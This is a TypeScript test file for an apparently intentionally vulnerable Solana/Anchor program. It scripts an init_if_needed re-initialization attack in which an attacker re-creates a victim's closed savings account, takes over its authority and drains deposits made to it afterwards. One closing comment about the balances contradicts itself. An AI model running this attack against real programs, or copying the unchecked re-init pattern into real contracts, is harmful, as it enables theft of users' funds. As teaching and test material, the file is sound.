/**
 * VULN 07 — Re-initialization attack via init_if_needed.
 *
 * The savings PDA is seeded only by a user-chosen tag, and open_savings
 * uses init_if_needed with `user` as an unchecked account. After the
 * victim legitimately closes their account, the attacker re-creates the
 * SAME address with themselves as authority and then drains the fresh
 * deposits the victim's automation keeps sending.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  createMint, createAccount, mintTo, tokenBalance, BN,
} from "./util";

const TAG = "victim-tag-123";

describe("vuln07 reinit / authority snipe", () => {
  const program = anchorProgram("vuln07_reinit", PROG_IDS.vuln07);
  const vaultPda = findPda([seedsBuf("vault")[0]], PROG_IDS.vuln07)[0];
  const savingsPda = findPda([seedsBuf("savings")[0], Buffer.from(TAG, "utf-8")], PROG_IDS.vuln07)[0];

  let mint: any, victim: any, attacker: any;
  let victimAta: any, attackerAta: any;

  before(async () => {
    const trace = (m: string) => require("fs").appendFileSync("/tmp/vuln07-steps.log", m + "\n");
    require("fs").writeFileSync("/tmp/vuln07-steps.log", "START\n");
    try {
      trace("airdrop deployer");
      await airdrop(provider.wallet.publicKey, 50);
      trace("keypairs");
      victim = await newFundedKeypair();
      attacker = await newFundedKeypair();

      trace("createMint");
      mint = await createMint(provider.connection, provider.wallet.payer, provider.wallet.publicKey, null, 6);
      trace("victim ata");
      victimAta = await createAccount(provider.connection, provider.wallet.payer, mint, victim.publicKey);
      trace("attacker ata");
      attackerAta = await createAccount(provider.connection, provider.wallet.payer, mint, attacker.publicKey);
      trace("mintTo");
      await mintTo(provider.connection, provider.wallet.payer, mint, victimAta, provider.wallet.publicKey, 1000);

      trace("initialize");
      await program.methods.initialize().accounts({ mint }).rpc();

      // Victim lifecycle: open -> deposit -> close (their own right).
      trace("victim open");
      await program.methods.openSavings(TAG)
        .accounts({ savings: savingsPda, user: victim.publicKey, payer: victim.publicKey })
        .signers([victim]).rpc();
      trace("victim deposit");
      await program.methods.deposit(new BN(500))
        .accounts({ savings: savingsPda, user: victim.publicKey, userAta: victimAta, vault: vaultPda })
        .signers([victim]).rpc();
      trace("victim close");
      await program.methods.closeSavings()
        .accounts({ savings: savingsPda, user: victim.publicKey })
        .signers([victim]).rpc();
    } catch (e: any) {
      trace("FAILED: " + e.message?.slice(0, 220));
      throw e;
    }
  });

  it("attacker snipes the closed PDA and becomes the authority", async () => {
    // init_if_needed sees an empty account and re-creates it with the
    // ATTACKER as authority. The victim never signed anything here.
    await program.methods.openSavings(TAG)
      .accounts({ savings: savingsPda, user: attacker.publicKey, payer: attacker.publicKey })
      .signers([attacker]).rpc();

    const savings = await program.account.savings.fetch(savingsPda);
    assert.equal(savings.authority.toString(), attacker.publicKey.toString());
  });

  it("victim's automation re-deposits into the hijacked account", async () => {
    // Permissionless deposit: the victim's service keeps topping up the
    // same address, unaware the authority changed.
    await program.methods.deposit(new BN(300))
      .accounts({ savings: savingsPda, user: victim.publicKey, userAta: victimAta, vault: vaultPda })
      .signers([victim]).rpc();
    const savings = await program.account.savings.fetch(savingsPda);
    assert.equal(savings.balance.toString(), "300");
  });

  it("attacker drains everything", async () => {
    await program.methods.withdraw(new BN(300))
      .accounts({
        savings: savingsPda,
        user: attacker.publicKey,
        destinationAta: attackerAta,
        vault: vaultPda,
      })
      .signers([attacker]).rpc();

    assert.equal((await tokenBalance(attackerAta)).toString(), "300");
    // The attacker takes the fresh deposits; the victim's pre-close balance
    // (withdrawn before closing) left nothing, but the 500 deposited
    // BEFORE the close stayed untouched: the vault keeps it.
    assert.equal((await tokenBalance(vaultPda)).toString(), "500");
  });
});
